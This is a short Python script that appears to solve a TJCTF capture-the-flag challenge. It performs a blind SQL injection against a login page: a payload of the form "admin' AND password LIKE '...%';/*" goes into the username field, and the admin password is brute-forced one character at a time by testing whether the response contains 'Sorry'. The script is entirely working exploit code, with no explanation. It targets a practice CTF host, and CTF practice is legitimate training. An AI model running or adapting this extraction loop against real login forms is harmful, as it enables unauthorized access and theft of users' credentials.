import requests
import base64
import string
mydata = {'username': "admin' AND password LIKE 'bline%';/*", "password": "abc"}
link = "https://weak_password.tjctf.org/login"
#print(response.text[1732:1737])
symbols = string.ascii_lowercase+"0123456789"
pword = ""
def make_injection(word):
    return f"admin' AND password LIKE '{word}%';/*"
for i in range(14):
    for symbol in symbols:
        mydata['username'] = make_injection(pword+symbol)
        response = requests.post(link, data = mydata)
        if(response.text[1732:1737]!= "Sorry"):
            pword += symbol
            break
print(f"tjctf{{{pword}}}")

